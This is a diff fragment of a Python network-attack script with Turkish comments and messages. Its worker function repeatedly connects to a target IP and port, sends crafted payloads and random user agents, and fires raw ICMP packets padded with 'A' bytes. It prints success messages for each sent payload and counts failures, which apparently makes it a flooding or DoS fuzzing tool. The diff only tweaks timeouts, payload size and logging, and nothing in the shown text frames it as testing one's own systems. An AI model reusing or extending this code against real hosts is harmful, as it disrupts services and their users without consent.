@@ -703,14 +703,19 @@ def worker(ip, port, combined_str, request, sendbutton, payload):
         print(bccolar.blm + "[+]" +  bccolar.GREEN  +"İstekler başarıyla gönderildi")
 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(0.05)
+        s.settimeout(0.5)
         s.connect((ip, port))
         s.send(combined_str.encode("utf-8"))
-        s.send(sendbutton)
-        s.send(payload)
-        s.send(random_user_agent.encode('utf-8'))  # Burada random_user_agent'ı UTF-8 formatında gönderiyorum
+        print(bccolar.blm + "[+]" +  bccolar.GREEN  +"Özel Payload başarıyla gönderildi")
+        s.send(sendbutton.encode('utf-8'))
+        print(bccolar.blm + "[+]" +  bccolar.GREEN  +"Farklı Payload başarıyla gönderildi")
+        s.send(payload.encode('utf-8'))
+        print(bccolar.blm + "[+]" +  bccolar.GREEN  +"Payload başarıyla gönderildi")
+        s.send(random_user_agent.encode('utf-8'))  
+        print(bccolar.blm + "[+]" +  bccolar.GREEN  +"User Agentler başarıyla gönderildi")
         icmp_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-        payload = bytes("A" * 14000, "utf-8")
+        payload = bytes("A" * 1400, "utf-8")
+        print(bccolar.blm + "[+]" +  bccolar.GREEN  +"Fuzzer Payload başarıyla gönderildi")
         icmp_packet = create_icmp_echo_request(os.getpid() & 0xFFFF, 1, len(payload))
         icmp_sock.sendto(icmp_packet, (ip, 1))
         icmp_sock.close()
@@ -721,8 +726,9 @@ def worker(ip, port, combined_str, request, sendbutton, payload):
         print(bccolar.RED + "[-] ICMP error:", e)
         failed_requests += 1
     finally:
-        if 's' in locals():  # Eğer 's' değişkeni tanımlıysa kapat
+        if 's' in locals(): 
             s.close()
+
 
 
 def main():
